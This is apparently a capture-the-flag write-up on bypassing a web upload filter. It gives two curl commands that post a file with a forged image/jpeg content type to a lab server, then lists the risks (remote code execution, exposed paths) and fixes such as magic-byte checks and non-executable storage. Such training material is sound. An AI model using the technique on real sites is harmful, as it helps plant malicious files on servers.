# Content-Type Bypass 

## How We Found It
We found this page on the home page, at the bottom there is an Add image button. on this page we can upload a file.  
what happens if we try to upload a normal image ?  
```
/tmp/JavaScript-logo.jpg succesfully uploaded.
```
intresting. the site tells me where the file is uploaded which might not be a good idea. what if I upload a script and somehow manage to make the server execute it.
Let's try to send a random file I have.
```
Your image was not uploaded.
```
:( why doesn't it accept my file. is it the extention ? let's try to rename it  
```
/tmp/output.jpg succesfully uploaded.
```
it is uploaded but I don't get anything. maybe I need to do something else, how would it be executed if it doesn't have the right extention.
let's modify the headers and request content using curl.

first, we're going to try to upload a file normally using curl with this command  :
```
curl -X POST -F "uploaded=@JavaScript-logo.jpg" -F Upload=Upload "http://192.168.56.101/?page=upload"
```
it worked, nice now let's try to modify the content-type settings in the `uploaded` field with this command
```
curl -X POST -F "uploaded=@output.path;type=image/jpeg" -F Upload=Upload "http://192.168.56.101/?page=upload"
```
it worked and I got the flag.

## Utility of It
- Allows an attacker to upload and possibly execute malicious files (e.g., scripts or binaries) on the server.
- Can lead to Remote Code Execution (RCE) if the file is interpreted by the server.
- Can expose internal paths or enable path traversal, depending on how uploaded files are handled.
- Dangerous in CTFs and real-world apps alike.

## How Can We Patch It
- Strictly validate file types server-side, not just by extension or content-type header.
- Use MIME sniffing + magic byte checks to confirm file content matches expected type.
- Rename uploaded files and store them in non-executable directories.
- Disallow direct access to uploaded files unless absolutely necessary.
- If uploads are needed, serve them via a proxy or from a CDN that does not allow execution.
